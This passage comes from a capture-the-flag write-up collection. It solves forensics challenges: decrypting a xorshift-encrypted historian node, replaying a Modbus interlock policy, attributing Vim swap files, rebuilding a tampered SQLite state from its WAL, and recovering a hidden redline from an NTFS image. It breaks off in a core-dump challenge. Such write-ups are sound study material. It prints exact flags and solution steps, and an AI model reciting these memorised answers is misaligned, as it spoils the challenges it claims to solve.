        s ^= (s << 13) & 0xffffffff; s ^= s >> 17; s ^= (s << 5) & 0xffffffff
        out += bytes(a ^ b for a, b in zip(d[i:i+4], struct.pack("<I", s)))
    print(out.decode())
```

`grid_topology.cfg` comes out as the historian node's topology safety configuration, with `NODE_ID=MGA-
HIST-07`, `CHECKSUM=pending-resync`, and `SAFETY_INTERLOCK_TOKEN=CSCTF{xorshift_ghost_in_the_historian_
d2c19434a637}`. `historian_cache.dat` holds two CSV pressure readings and `node_status.json` a JSON status
record, both consistent with node ID `MGA-HIST-07`.

**Why it works**

The encryptor's only secret is `time() ^ getpid()`, and it leaves both halves on the volume: the PID in its
own log line, the exact second in the mtimes it stamped onto its outputs with `utime()`. xorshift32 is
fully determined by its seed, so knowing the seed means knowing the whole keystream. And deleting a file on
ext4 clears the inode's extents but not the data blocks, so the binary can still be carved from unallocated
space.

**Validation / reproduction**

Because the generator state carries over between files, the second and third files only decrypt correctly
if the seed, the shift constants and the file order are all right. All three came out as clean text — a
config file, CSV pressure readings and a JSON status record, all consistent with the node ID — and the
token matched the flag format.

Reproduction summary: `fls`/`istat` to get the encryptor PID (log) and the exact seed second (the `.enc`
mtimes); `blkls`+`dd` to carve the 14,472-byte ELF from unallocated space; `objdump` to recover the seed
formula, the xorshift32 step and the `strcmp` file order; compute `seed = (t ^ pid) * 0x9E3779B1 &
0xffffffff = 0x40D8E565`; run one continuous keystream over the three ciphertexts in `strcmp` order.
Gotchas: do not reseed per file (the state is global); the exact second must come from the `utime()`-set
mtime, not the minute-precision log line; watch the `pid == (uint32)t` fallback to `0xA5A5A5A5` (it does
not apply here). The first three sends came back `ratelimited` (not judged); the single value was accepted
on the fourth.

### Interlock Witness

> Forensics · Medium · Chronos Security  
> Points: 270 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{1198b297c84064fab89d0f3e3e5308791165333c1b64da17185dd51493b6f339}`

**Challenge**

A fictional grid-support station fed an allied depot network. Its response-cell interlock read false while the controller accepted syntactically valid Modbus/TCP maintenance writes. The attachment `interlock-witness.zip` (15,307 bytes) holds a capture, `interlock.pcapng`, plus three short Markdown specs: a register map, a written response-cell policy, and a witness-format spec with a test vector. The task is to apply that policy exactly, reconstruct the accepted target writes that violate it, and derive the incident witness, a SHA-256 submitted as `CSCTF{<64 lowercase hex>}`. The safety policy is an offline forensic classification rule, not a controller feature; the controller itself accepted everything.

**Approach**

*1. Read the three specs first.* This is a spec-application challenge, so the documents define the task. The register map lists five zero-based holding-register words: `maintenance_permit` (0x000A), `isolation_state` (0x000B), `protection_armed` (0x000C), `trip_limit` (0x0013) and `restore_delay` (0x0014). The policy defines:

- A **target** transaction is an accepted FC16 (Write Multiple Registers) of quantity 1 at `0x0013` or `0x0014`.
- An FC16 is **accepted** only when its reversed-flow normal response matches transaction ID, protocol ID, unit ID and function code and echoes the start address and quantity; exception responses change nothing.
- An FC03 (Read Holding Registers) is accepted only when its response byte count is twice the request quantity; it then refreshes every mapped word it covers.
- A write **takes effect only after its response**.
- A target is **unsafe** when at least one of the three interlock words is not 1 immediately before its normal response.

The witness format: for each unsafe target, in normal-response order, append its request PDU then its paired normal-response PDU (function code plus data, **no MBAP header**) to form `T`. Then `W = SHA-256(P || T)` where `P` is the 20 bytes `49 4e 54 45 52 4c 4f 43 4b 2d 57 49 54 4e 45 53 53 2f 31 00` (ASCII `INTERLOCK-WITNESS/1` plus a trailing zero). The spec includes a non-incident serialization vector with its own expected `W` as a format check. The sentence "submit `CSCTF{` plus lowercase hexadecimal `W` plus `}`" is a format description, not a flag.

*2. Confirm P and the "raw PDU bytes" idea on the published vector.* Before touching the capture, build `P` from the spec hex and hash it with the vector's `T`:

```sh
echo '49 4e 54 45 52 4c 4f 43 4b 2d 57 49 54 4e 45 53 53 2f 31 00' | xxd -r -p > P.bin
echo '10 00 13 00 01 02 00 2a 10 00 13 00 01' | xxd -r -p > vector_T.bin
cat P.bin vector_T.bin | shasum -a 256
```
```
b6e58fa962e382b112eb596e416d5680495fc4bd02141f2389797f194df34786  -
```

This equals the spec's expected `W`, which confirms the recipe: hash raw bytes (not hex text), leave out the MBAP header. Each single-register FC16 adds 13 bytes to `T`: an 8-byte request (`10`, start, quantity, byte count `02`, value) and a 5-byte response (`10`, start, quantity).

*3. Survey the capture.* Establish the shape before replaying:

```sh
tshark -r interlock.pcapng -q -z conv,tcp
tshark -r interlock.pcapng -Y mbtcp -T fields -e tcp.dstport -e mbtcp.prot_id -e mbtcp.unit_id -e modbus.func_code -e modbus.exception | sort | uniq -c
tshark -r interlock.pcapng -Y tcp.analysis.flags | wc -l
```

One TCP connection, client 127.0.0.1:59818 to controller port 502; 504 of 512 frames carry Modbus. Protocol ID 0 and unit ID 1 throughout, only FC03 and FC16, `modbus.exception` False everywhere, and zero TCP analysis flags (no retransmissions, duplicates or reordering). The session is clean and strictly sequential.

*4. Confirm pairing.* Each response follows its own request with the same transaction ID and function code. A one-line check over the whole capture:

```sh
tshark -r interlock.pcapng -Y mbtcp -T fields -e frame.number -e tcp.dstport -e mbtcp.trans_id -e modbus.func_code -e modbus.request_frame | awk -F'\t' '$2==502{req=$1;tid=$3;fc=$4;next}{n++;if($5==req&&$3==tid&&$4==fc)ok++}END{print n" responses, "ok" directly follow their own request"}'
```
```
252 responses, 252 directly follow their own request
```

*5. Group FC16 writes by address* as a cross-check against the policy's promised counts:

```sh
tshark -r interlock.pcapng -Y 'tcp.dstport==502 && modbus.func_code==16' -T fields -e modbus.reference_num -e modbus.word_cnt | sort -n | uniq -c
```

This yields 60 writes to `trip_limit` (19) and 60 to `restore_delay` (20), all quantity 1 (120 targets), plus exactly the eight others the policy promises: five that update the interlock-state words (arm protection, grant permit, isolate, reconnect, re-isolate) and three acknowledgement writes to unmapped `0x0018`-`0x001A`.

*6. Replay the policy.* Export each Modbus frame's raw TCP payload, then run the replay:

```sh
tshark -r interlock.pcapng -Y mbtcp -T fields -e frame.number -e tcp.dstport -e tcp.payload > adus.tsv
python3 replay_policy.py adus.tsv T.bin
```

The script splits MBAP (transaction ID, protocol ID, length, unit ID) from the PDU, pairs each response with the preceding request, updates the five mapped words from accepted FC03 reads and FC16 writes **after** each response, and judges every target write on the three interlock words as they stood just before its response. The verdict core:

```python
before = [state.get(a) for a in (0x000A, 0x000B, 0x000C)]   # permit, isolation, armed
if qty == 1 and start in (0x0013, 0x0014):
    if before == [1, 1, 1]:
        verdict = "target, safe"
    else:
        T += req + pdu                                       # unsafe: append request||response PDU
```
```
unsafe accepted targets: 16 -> T = 208 bytes written to T.bin
FC03 observations accepted: 124, rejected: 0
FC16 writes accepted: 128 (120 targets, 8 ineligible), not accepted: 0
```

The 16 unsafe targets fall in two windows: at session start, before the permit and isolation writes (permit 0, isolation 0), and after a mid-session write (frame 254) sets `isolation_state` back to 0, until frame 288 re-isolates. The "effect after response" timing is what makes frames 44/288 still show isolation 0 at their own response while the target writes that follow them see 1 and are safe. `T` is 16 × 13 = 208 bytes.

*7. Hash the witness.*

```sh
wc -c P.bin T.bin
cat P.bin T.bin | shasum -a 256 | awk '{print "CSCTF{" $1 "}"}'
```
```
      20 P.bin
     208 T.bin
CSCTF{1198b297c84064fab89d0f3e3e5308791165333c1b64da17185dd51493b6f339}
```

`T` opens with the first unsafe write's request `10 00 13 00 01 02 04 0d` (1037 = 0x040d into `trip_limit`) and its response `10 00 13 00 01`, matching the vector's layout. `P` (20) plus `T` (208) is 228 bytes of SHA-256 input.

**Why it works**

The session is one strictly sequential Modbus/TCP exchange, so request/response pairing is unambiguous and the client re-reads all five mapped words between writes. Those reads always agree with the replayed writes, so the replayed state at each acknowledgement is exact and no state change is hidden. The policy's "after the response" timing is what makes the writes following the permit and isolation writes safe and the first write after each reconnection unsafe. The witness is a SHA-256 over a fixed prefix and the raw PDUs of exactly those transactions, so any slip, keeping the MBAP header, including an ineligible or safe write, wrong order, or hashing hex text instead of bytes, changes the hash. The published vector lets you check the hashing in isolation.

**Validation / reproduction**

The test vector reproduced exactly, the replay's totals matched the policy's stated counts (128 accepted FC16 = 120 targets + 8 ineligible; 124 FC03 accepted, none rejected), and `T` had the expected 208 bytes. The team's automated intake pass had already submitted two strings lifted verbatim from the brief's format sentence, which were rejected; the derived witness was the first real answer submitted, and it was accepted.

Reproduction summary: (1) verify the zip and member hashes; (2) read all three specs; (3) reproduce the test vector to lock the `P`/PDU-bytes recipe; (4) survey with tshark (one connection, protocol 0 / unit 1, only FC03 + FC16, no exceptions, no TCP flags); (5) confirm 252 clean pairs and the 120 + 8 FC16 split; (6) export `frame, dstport, tcp.payload` and replay to get `T` = 208 bytes; (7) hash `P || T`. Gotchas: the format sentence is not the flag; PDUs carry no MBAP header; apply writes only after their response; and the two reconnection writes (frames 44, 288) are themselves ineligible, not targets.

### Last Buffer

> Forensics · Easy · Chronos Security  
> Points: 120 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{last_buffer_4051c9f6b0d9622479785f613b063916}`

**Challenge**

An endpoint collector held two Vim recovery files for the same incident note: a periodic snapshot and the one grabbed when the shell dropped. Both restore cleanly, but only one came from the shell that died during the response window; the other is an earlier drill revision. The handout, `last-buffer-handout.zip` (3,270 bytes), contains two 12 KiB Vim swap captures (`incident-2026-10-07.md.swp` and `.md.swo`, renamed by the collector, which dropped the leading dot from the hidden names), the saved note `incident-2026-10-07.md`, `case-context.json`, an audit timeline, a shell journal, and `vim-swap-layout.md`. Recover both buffers, work out which one came from the shell that mattered, and return its encoded read-back proof.

**Approach**

*1. Fix the response window from the case material.*

```sh
python3 -m json.tool case-context.json
cat audit-timeline.jsonl shell-journal.jsonl
```

`case-context.json` sets the crash window to 02:19:30Z–02:20:00Z on `pts/4`, names the saved file, and states that the collector removed the leading dot from both captures. The timeline shows two Vim sessions editing the note:

- **PID 8124 on `pts/7`** started at 02:10:03, its swap was grabbed by a periodic EDR snapshot at 02:11:51, and the editor exited cleanly (`PROC_EXIT success`) at 02:12:18.
- **PID 8442 on `pts/4`** started at 02:18:04, wrote its swap at 02:19:38, was killed by SIGHUP at 02:19:46 when the link reset, and was captured as a disconnect snapshot a second later. That is the shell that died inside the window.

The journal also records the `pts/4` user running `sha256sum incident-2026-10-07.md` at 02:18:31, producing `01c2a034f1a47e4c...`. That gives a second, independent check: the buffer from the dead shell should be built on exactly that file.

*2. Ignore the extensions.* Both captures came from the same hidden `.incident-2026-10-07.md.swp` path, so the `.swp`/`.swo` names are the collector's, not Vim's. Vim's usual convention (`.swp` for the first editor, `.swo` for a second) would tempt you to treat the `.swo` as the newer buffer, and here that is the wrong one. The real link to a process lives in the swap header.

*3. Recover both buffers non-interactively.* Give `-r` the swap file directly; there is no need to rename it back:

```sh
vim -Nu NONE -i NONE -n -es -r incident-2026-10-07.md.swp -c '%p' -c 'qa!' > out/swp.md
vim -Nu NONE -i NONE -n -es -r incident-2026-10-07.md.swo -c '%p' -c 'qa!' > out/swo.md
```

`-Nu NONE -i NONE` skips vimrc and viminfo, `-n` stops Vim writing its own swap, `-es` runs silent batch, `%p` prints the recovered buffer and `qa!` quits without saving. The `.swp` recovers:

```
revision_id: INC-4471/R18
base_file_sha256: 01c2a034f1a47e4cb5536d66394c4774a1f1c568ff4e34c0de7f654aa42bc849
status: UNSAVED-AT-DISCONNECT
authorization_encoding: base64url
authorization_b64: Q1NDVEZ7bGFzdF9idWZmZXJfNDA1MWM5ZjZiMGQ5NjIyNDc5Nzg1ZjYxM2IwNjM5MTZ9
```

and the `.swo`:

```
revision_id: INC-4471/R16-DRILL
base_file_sha256: a5bcac6de8153876627fd1928b9f32060714d7280a07598f2f8ef70535f07d19
status: PERIODIC-SNAPSHOT
authorization_b64: cmV0aXJlZC10cmFpbmluZy1yZWFkYmFjay0xNg
```

Both carry an `authorization_b64` field. The in-note labels already point one way, but they are only text typed into the buffer; the attribution has to come from the swap header and the timeline.

*4. Tie each swap to its Vim process through block 0.* A Vim swap file starts with block 0, written when the swap is created: magic `b0`, the page size at offset 12, the owning PID as a little-endian u32 at offset 24, then the user name at offset 28, host at 68 and original path at 108 (`vim-swap-layout.md` lists the same offsets). Read the header, look the PID up in the timeline, and compare each note's `base_file_sha256` against the SHA-256 of the saved note:

```python
b0 = open(swap, "rb").read(1024)
assert b0[:2] == b"b0"
pid  = struct.unpack_from("<I", b0, 24)[0]
host = b0[68:108].split(b"\0")[0].decode()
path = b0[108:1008].split(b"\0")[0].decode()
```
```
incident-2026-10-07.md.swp
  block 0:   pid 8442, opnight@noc-jump-1:/home/opnight/incident-2026-10-07.md
  timeline:  pts/4 02:19:38 SWAP_WRITE, 02:19:46 ANOM_ABEND, 02:19:47 SWAP_SNAPSHOT
  base file: 01c2a034f1a47e4c... matches the saved note

incident-2026-10-07.md.swo
  block 0:   pid 8124, opnight@noc-jump-1:/home/opnight/incident-2026-10-07.md
  timeline:  pts/7 02:11:51 SWAP_SNAPSHOT, 02:12:18 PROC_EXIT
  base file: a5bcac6de8153876... does not match
```

The `.swp` carries PID 8442, the shell that died on `pts/4` inside the window, and its base hash matches both the saved note on disk and the `sha256sum` the user ran on `pts/4`. The `.swo` carries PID 8124, the earlier `pts/7` session that exited cleanly, labeled `R16-DRILL`, with a base hash that does not match. Two independent facts (PID/terminal/exit-cause and base-file hash) agree, so the `.swp` buffer is the one from the shell that mattered.

*5. Decode the proof.* The `.swp` buffer's `authorization_b64` is base64url; decode it:

```python
base64.urlsafe_b64decode(token + "=" * (-len(token) % 4)).decode()
```

The `.swp` value decodes straight to a complete `CSCTF{...}`:

```
CSCTF{last_buffer_4051c9f6b0d9622479785f613b063916}
```

The `.swo` value decodes to `retired-training-readback-16`, a plain-text drill decoy; it is not a flag and must not be wrapped in `CSCTF{}`. The real proof already decodes to a full flag frame, so it is submitted as-is.

**Why it works**

A Vim swap file's block 0 records the PID of the Vim process that created it, along with the user, host and original path, and `vim -r` rebuilds the unsaved buffer from the data blocks behind it. The audit timeline maps those PIDs to terminals and exit causes, so the header ties each buffer to one shell: only PID 8442, the Vim on `pts/4`, died by SIGHUP at 02:19:46 inside the 02:19:30–02:20:00 window, and only the `.swp` carries that PID. Its `base_file_sha256` also matches the file the user had just hashed, a second, independent confirmation. Neither the filenames the collector assigned nor the note's own `R18`/`R16-DRILL` labels are needed; the process attribution carries the whole decision.

**Validation / reproduction**

During the event, the team's automated intake pass (recursive extraction plus a flag hunt that decodes encodings) pulled the only `CSCTF{...}`-shaped candidate out of the swap data. It submitted that candidate about 20 seconds after intake started, and it was accepted on first submission. The PID/timeline/hash attribution above is the full reasoning for why that buffer is the right one; the other buffer's proof decodes to `retired-training-readback-16`, not a flag frame, so the two could not be confused.

Reproduction summary: (1) unzip and read the case context, timeline and journal to fix the 02:19:30–02:20:00Z window on `pts/4`; (2) recover both swaps with `vim -r` in batch mode; (3) parse block 0 of each swap for its PID and match it to the timeline; (4) confirm the chosen buffer's `base_file_sha256` matches the saved note and the journal's `sha256sum`; (5) base64url-decode its `authorization_b64`. Gotchas: don't trust the `.swp`/`.swo` extensions or the in-note revision labels; the `.swo` proof is a deliberate decoy; and the recovered buffer is named after `/home/opnight/incident-2026-10-07.md`, so quit with `qa!` rather than writing it out.

### Last Commit

> Forensics · Medium · Chronos Security  
> Points: 270 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{last_commit_40f3b19d5a11601e9d5e5bf0c7a3bcb6248b5667764f25549b607c27396ccf5f}`

**Challenge**

A national land registry's completed restoration export, job `LR-731`, may have carried altered ownership to regional offices before the database was put back to a clean-looking state. We are given the SQLite database and its write-ahead log as a pair (`registry.sqlite` + `registry.sqlite-wal`), the delivery receipt `delivery.csv` (12 parcels in a fixed order), and `export-profile.md`, which defines the export query, its exact byte formatting, and the flag construction. The task is to reconstruct the export *as it stood at the moment the job flipped to `COMPLETED`* — not as the current, restored view shows it — and take its SHA-256. The archive `last-commit.zip` (84,979 bytes) ships with its own SHA-256 so the download can be checked before extraction.

Everything is done with the Python 3 standard library: `struct` to parse the WAL by hand, and `sqlite3` opened read-only to run the export query. No `sqlite3` shell and no database browser are used, deliberately.

**Approach / walkthrough**

*1. Extract, and never open the pair with a real client.* After verifying the archive hash and unzipping, the directory holds `registry.sqlite`, `registry.sqlite-wal`, `delivery.csv`, `export-profile.md`, plus background files (`README.txt`, `provenance.json`, `SHA256SUMS`). The one hard rule: do not open `registry.sqlite` with the `sqlite3` CLI or any browser while the `-wal` is beside it. SQLite would replay the log, and on connection close it would **checkpoint** every logged page into the main file and delete the WAL. The log is the evidence; losing it means re-extracting the archive. All work is on read-only copies.

*2. Read the export profile.* `export-profile.md` pins down what to rebuild. The export job runs inside a single `IMMEDIATE` transaction: it evaluates the query over the receipt's parcels, stages the result, changes `LR-731` from `QUEUED` to `COMPLETED`, and commits — nothing else writes in between. So the delivered export is the profile's query run against the database exactly as it stood at the commit that set `LR-731` to `COMPLETED`. The receipt rows load into a temp table `manifest(job_id, position, parcel_id)` the query joins against. The output is a fixed header line followed by the query rows, fields separated by single TAB bytes, every line (including the last) ended by LF; the SHA-256 of those bytes, in lowercase hex, is the flag body. A digest `26114af3…` near the end of the profile belongs to a formatting example and is a decoy — it is not this case's answer.

*3. Parse the WAL by hand, commit by commit.* A WAL starts with a 32-byte header: magic (`0x377f0682` meaning the checksum words are little-endian 32-bit), page size (4096 here), two salts, and two checksum words over the first 24 bytes. Each frame is a 24-byte header (page number; database size in pages, nonzero only on a commit frame; the two salts; two checksum words) followed by a full page image. The checksum is cumulative — each frame continues the running checksum over the first 8 bytes of its header and its page data — so the first frame that fails to verify ends the valid region. The replay script walks valid frames, groups them into committed transactions (a nonzero db-size field marks a commit), and after each commit builds a standalone database image: the main file with every page overlaid by its newest committed copy. Two header bytes at offsets 18/19 are set to 1 in each copy so SQLite treats the image as rollback-journal mode and never looks for a `-wal`.

The core of the WAL checksum and the frame loop:

```python
def wal_checksum(data, s0, s1, big_endian):
    words = struct.unpack((">" if big_endian else "<") + "%dI" % (len(data)//4), data)
    for i in range(0, len(words), 2):
        s0 = (s0 + words[i]   + s1) & 0xFFFFFFFF
        s1 = (s1 + words[i+1] + s0) & 0xFFFFFFFF
    return s0, s1
# ... per frame:
s0, s1 = wal_checksum(wal[off:off+8] + page, s0, s1, big_endian)
if (s0, s1) != (f_ck1, f_ck2):
    break  # cumulative checksum broken: nothing after this is valid
if db_pages:   # nonzero database-size field = commit frame
    commits.append((pending, db_pages)); pending = []
```

Running it reports `9 valid frames, 6 commits, 0 uncommitted frames`. The database is tiny — page 1 is the schema and each table/index is a single root page (pages 2–9) — so the page name printed per frame names the table it rewrote:

```
commit 1:  frame 1  page 2  parcel
commit 2:  frame 2  page 6  title ; frame 3  page 7  sqlite_autoindex_title_1
commit 3:  frame 4  page 8  export_job ; frame 5  page 9  sqlite_autoindex_export_job_1
commit 4:  frame 6  page 8  export_job
commit 5:  frame 7  page 6  title ; frame 8  page 7  sqlite_autoindex_title_1
commit 6:  frame 9  page 2  parcel
```

*4. Run the export at each commit and read the state.* For each image the script opens it read-only, reads `export_job`, loads the receipt into `manifest`, runs the profile's query, formats TSV with trailing LF, and hashes it:

```
commit  source      LR-731 state  export SHA-256
     0  main file   -             04a47a4f6a9c822d...
     1  frame 1     -             04a47a4f6a9c822d...
     2  frames 2-3  -             40f3b19d5a11601e...
     3  frames 4-5  QUEUED        40f3b19d5a11601e...
     4  frame 6     COMPLETED     40f3b19d5a11601e...  <- LR-731 turns COMPLETED
     5  frames 7-8  COMPLETED     04a47a4f6a9c822d...
     6  frame 9     COMPLETED     04a47a4f6a9c822d...
```

The story is now plain. Commit 1 rewrites the `parcel` page (parcel 1201's district, outside the receipt, so the export is unchanged). Commit 2 rewrites `title` and its index, and the export digest changes to `40f3b19d…`. Commit 3 inserts `LR-731` as `QUEUED`. Commit 4 is the job's own transaction — it only flips `LR-731` to `COMPLETED`, so this is the state the delivered export was taken from. Commit 5 rewrites `title` again, restoring the original rows, and the digest returns to `04a47a4f…` (the registry "looks normal again"). Commit 6 touches another out-of-receipt parcel. A normal open applies all six commits and lands on commit 6, where `LR-731` is also `COMPLETED` but the titles are the restored ones — the deceptive clean view.

*5. Confirm the tampering and hash.* Diffing the commit-6 clean view against the commit-4 export shows four of the twelve parcels (1214, 1202, 1209, 1205) went out with different holders and instrument references, and parcel 1209 was split 6500/3500 instead of 6000/4000:

```
< 1  1214  D-02  P-32089905  HR-3046267890  10000  IN-5373724204
> 1  1214  D-02  P-32089905  HR-1766993918  10000  IN-6941538207
< 4  1209  D-01  P-58783439  HR-3959056687   6000  IN-6674401937
> 4  1209  D-01  P-58783439  HR-5532376336   6500  IN-7259841360
```

The commit-4 export is saved as `out/LR-731_export.tsv`; its SHA-256 is the flag body:

```
40f3b19d5a11601e9d5e5bf0c7a3bcb6248b5667764f25549b607c27396ccf5f  out/LR-731_export.tsv
```

giving `CSCTF{last_commit_40f3b19d5a11601e9d5e5bf0c7a3bcb6248b5667764f25549b607c27396ccf5f}`.

**Why it works**

In WAL mode SQLite leaves the main file untouched during a transaction and appends new page images to the log; the frame with a nonzero database-size field closes the transaction. Because nothing was checkpointed during the retained epoch, every intermediate page version still lives in the log, and overlaying frames up to a given commit reproduces the database exactly as a reader saw it right after that commit. The attacker swapped the title rows in commit 2, let the export job read and deliver them at commit 4, then restored the originals in commit 5. The current view therefore looks clean while the state at the `COMPLETED` transition holds the altered ownership that was actually shipped.

**Validation / reproduction**

The WAL header and all 9 frames pass SQLite's cumulative checksum chain, and the replay shows exactly one commit where `LR-731` becomes `COMPLETED`. The export digest is identical across commits 2–4 and differs on either side, matching a swap-and-restore. Before the solver ran, the team's automated intake had submitted three strings lifted from the brief's format text; all three were rejected. The reconstructed commit-4 digest was the first derived answer submitted, and it was accepted.

Reproduction in short: verify the archive hash, extract, and keep the `.sqlite`/`.sqlite-wal` pair untouched; run the `struct`-based WAL replay to build one standalone image per commit (setting header bytes 18/19 to 1); run the profile's query read-only at each image; take the export at the first `COMPLETED` state and SHA-256 it. Gotcha: never open the pair with a normal client — a single checkpoint deletes the WAL and the evidence with it; and ignore the profile's example digest, which is not this case's answer.

### Night Clerk

> Forensics · Easy · Mohamed Amine Mzoughi  
> Points: 120 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{hid_skew_redline}`

**Challenge**

A hostile clerk used a depot terminal to hide a coordination message before isolation, and only the retained stick image survives. We are handed `terminal.dd` (8,388,608 bytes), told to recover the hidden `CSCTF{...}` message from it, and reassured that "other exhibits it mentions are not provided and not needed" and that nothing needs to be run in Office or mounted. That reassurance is load-bearing: the intended key derives from two timing exhibits that are deliberately absent, and the challenge is solvable without them.

Tools: The Sleuth Kit (`fsstat`, `fls`, `icat`), `unzip`, and a short Python script. No mounting, which keeps the untrusted image read-only.

**Approach / walkthrough**

*1. Verify and identify.* After confirming the SHA-256 matches the brief, `mmls` finds no partition table — it is a bare volume. `fsstat terminal.dd` identifies it:

```
File System Type: NTFS
Volume Name: DESK
Size of MFT Entries: 1024 bytes
Range: 0 - 67
```

A tiny 8 MiB NTFS volume labelled `DESK`, Volume Serial `5952AC361A93C77A`, with only 68 MFT entries (range 0–67) and the MFT first cluster at 4. The whole file list is short and Sleuth Kit reads the volume directly from the raw image, so nothing is mounted and the host never touches the filesystem driver.

*2. List every file, including deleted ones.* `fls -r -p terminal.dd` walks the volume and prints full paths; deleted entries carry a `*`:

```
r/r 64-128-2:   README.TXT
-/r * 65-128-2: audit-0214.log
-/r * 66-128-2: night_audit.docx
```

Past the NTFS metadata files and empty reserved records, there are three user files: live `README.TXT` (inode 64) and two **deleted** files, `audit-0214.log` (inode 65) and `night_audit.docx` (inode 66). Their MFT records and clusters are still intact, so `icat` recovers them by inode without mounting:

```sh
icat terminal.dd 64 > out/README.TXT
icat terminal.dd 65 > out/audit-0214.log
icat terminal.dd 66 > out/night_audit.docx
```

*3. Read the recovered text.* `README.TXT` is the cover story: "Shift log clear. … No redline was saved." The deleted log `audit-0214.log` is the clerk's actual recipe:

```
Photo: desk.jpg
Capture: front_desk.pcapng
The Word file on this stick is a redline. Read the insertion, not the paragraph on screen.
DateTimeOriginal plus OffsetTimeOriginal is UTC.
Subtract that UTC time from the NTP transmit timestamp.
The difference, in whole seconds, XORs each ciphertext byte.
Hex-decode the tracked insertion first.
```

So: the Word file is a *redline* (tracked changes); the message is the **tracked insertion**, not the visible paragraph; the insertion is hex; and each byte is XORed with one key byte — a clock-skew value in seconds. The intended key would come from `desk.jpg`'s EXIF time and an NTP transmit timestamp in `front_desk.pcapng`. Those two files are **not** in the image — a byte-signature search for JPEG/pcapng markers finds only their names inside this log — and the brief confirms they are not needed. Ignore `README.TXT`'s "No redline was saved" (the cover story) too.

*4. Pull the tracked insertion from the .docx.* A .docx is a ZIP of XML parts; Word's revision marks live in `word/document.xml` (`<w:del>…<w:delText>` for deletions, `<w:ins>…<w:t>` for insertions). Reading it with `unzip -p`:

```xml
<w:p><w:r><w:t>Shift summary clean. Nothing unusual at the desk.</w:t></w:r></w:p>
<w:p>
  <w:del w:id="1" w:author="M. Keene" ...><w:r><w:delText>The key locker was checked at the start of shift.</w:delText></w:r></w:del>
  <w:ins w:id="2" w:author="M. Keene" ...><w:r><w:t>7a6a7a6d7f4251505d664a525c4e664b5c5d5550575c44</w:t></w:r></w:ins>
</w:p>
```

The visible paragraph ("Shift summary clean…") is the decoy. The tracked change by "M. Keene" deletes an innocent sentence and inserts the 46-character hex string `7a6a7a6d7f4251505d664a525c4e664b5c5d5550575c44` — 23 bytes. The other parts carry nothing (`settings.xml` just enables `<w:trackRevisions/>`; `people.xml`/`core.xml` repeat the desk line; `word/media/padding.bin` is 8192 bytes of `0xa5` filler).

*5. Recover the flag with a known-plaintext byte.* The ciphertext decodes from hex to `b'zjzm\x7fBQP]fJR\\NfK\\]UPW\\D'`. A single-byte XOR key is fully determined by one known plaintext byte, and flags begin `CSCTF{`. The first ciphertext byte is `0x7a`; `0x7a ^ 'C'` (`0x43`) = `0x39` = 57. Testing all 256 keys and keeping those that produce the `CSCTF{` prefix:

```python
ct = bytes.fromhex("7a6a7a6d7f4251505d664a525c4e664b5c5d5550575c44")
keys = [k for k in range(256) if bytes(b ^ k for b in ct).startswith(b"CSCTF{")]
# keys == [57];  key = 0x39 = ct[0] ^ ord('C')
print(bytes(b ^ 57 for b in ct).decode())   # CSCTF{hid_skew_redline}
```

Only key 57 yields the prefix, and the full 23-byte plaintext decodes as readable text ending in `}`:

```
CSCTF{hid_skew_redline}
```

The value 57 is also exactly the "difference in whole seconds" the recipe describes — the clock skew — so the two independent paths agree. The decoded plaintext `hid_skew_redline` even names the technique: a tracked-change (redline) insertion hidden behind a single-byte clock-skew XOR.

**Why it works**

Deleting a file on NTFS only clears the MFT record's in-use flag and the cluster bits in `$Bitmap`; the record (name, data runs) and the data stay on disk until reused, so `fls` still lists the deleted files and `icat` rebuilds them from their inode numbers. OOXML stores tracked revisions as plain `<w:del>`/`<w:ins>` elements in `document.xml`, so the "hidden" insertion is readable straight from the XML without Office. The payload is hex of a single-byte XOR; the intended key is a 57-second skew between a photo and a packet capture that were never supplied, but a one-byte key is pinned by one known plaintext byte, which makes the missing timing exhibits unnecessary.

**Validation / reproduction**

Of all 256 single-byte keys, only 57 produces the `CSCTF{` prefix, and with that key the entire 23-byte plaintext is readable and closes with `}` — a second check beyond the prefix match. A 57-second skew also fits the recipe's "whole seconds" story. Accepted on the first submission.

Reproduction in short: `fsstat`/`fls` the bare NTFS image, `icat` inodes 64/65/66, read the log for the recipe, `unzip -p … word/document.xml` to pull the `<w:ins>` hex, hex-decode to 23 bytes, and brute the single XOR byte against the `CSCTF{` crib (key 57). Gotcha: do not chase `desk.jpg` or `front_desk.pcapng` — they are not in the image and are not needed; the known-plaintext byte makes the key fully determined on its own.

### Operation Dawn: Relay Snapshot

> Forensics · Easy · Terminal43  
> Points: 120 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{20_dock_move_orchard_elm_grove_dusk_86659c}`

**Challenge**

Responders snapshotted a knocked-out military relay's process memory while recovering a standing order. We are given `relay.core` (586,928 bytes), a Linux x86-64 ELF core of a tiny program `/t`, and must recover the complete `CSCTF{...}` order from it. The order is stored in the process's heap as a linked list of short fragments, mixed with decoy records that splice into the real list's tail and a reversed stack copy that scrambles the sequence — so `strings` alone cannot tell you the order. The reliable reconstruction comes from the process's own saved registers.

Tools: `readelf`, `strings -t x`, `xxd`, and a small Python carver (stdlib only) for the heap chunks and the `NT_PRSTATUS` note.

**Approach / walkthrough**

*1. Map the memory.* A core has no sections, only `PT_LOAD` segments (one per memory mapping, giving the VA↔file-offset mapping) and a `PT_NOTE` segment (registers and the mapped-file list). `readelf -lW` lists the segments; `readelf -nW` prints the `NT_FILE` note. The key observations:

- `/t` (the program) ends at `0x55a77fe26000`. The RW segment at **VA `0x55a7aff17000`, file offset `0x33f8`, size `0x21000`** has no backing file in `NT_FILE` — it is the **heap** (its `0x21000` size is glibc's default first heap).
- The last segment, VA `0x7fffc035a000` at file offset `0x6b3f8`, is the **stack**.
- Address translation: `file_offset = VA − segment_VA + segment_offset`; for the heap that is `VA − 0x55a7aff17000 + 0x33f8`.

*2. Look for the order text.* `strings -a -t x` finds no complete `CSCTF{...}`. In the heap region (`0x36a4`–`0x3ac4`) it finds 23 short fragments spaced exactly `0x30` apart — one per small allocation — and on the stack one long blob at `0x8bbec`:

```
burn_it_bridgefall_backat_dawnstand_doburn_itrelieve_hold_thewn_nowregroup_fall_back_at_two59c}k_866_dusgroveelm_hard_e_orc_movdock{20_CSCTF
```

